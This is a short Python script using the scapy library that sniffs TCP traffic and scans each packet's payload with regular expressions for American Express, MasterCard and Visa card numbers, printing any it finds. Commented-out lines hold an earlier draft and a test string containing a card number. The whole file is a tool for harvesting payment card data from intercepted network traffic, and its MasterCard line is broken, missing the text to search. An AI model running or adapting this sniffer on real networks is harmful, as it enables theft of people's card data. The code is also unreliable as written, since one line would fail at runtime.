#!/usr/bin/python3
import re
from scapy.all import *
# def find_Credit_Card(raw):
#     americaRE = re.findall("3[47][0-9][13]",raw)
#     if americaRE:
#         print("[+] Found American Express Card: {}".format(americaRE[0]))

def find_Credit_Card(pkt):
    raw = pkt.sprintf('%Raw,load%')
    americaRE = re.findall("3[47][0-9]{13}",raw)
    masterRE = re.findall("5[1-5][0-9]{14}")
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?',raw)
    if americaRE:
        print ('[+] Found American Express Card: ' + americaRE[0])
    if masterRE:
        print ('[+] Found MasterCard Card: ' + masterRE[0])
    if visaRE:
        print( '[+] Found Visa Card: ' + visaRE[0])


if __name__ == "__main__":
    sniff(filter="tcp",prn=find_Credit_Card,store=0)
    # tests = []
    # tests.append('I would like to buy 1337 copies of that dvd')
    # tests.append('Bill my card: 378282246310005 for \$2600')
    # for test in tests:
    #     find_Credit_Card(test)
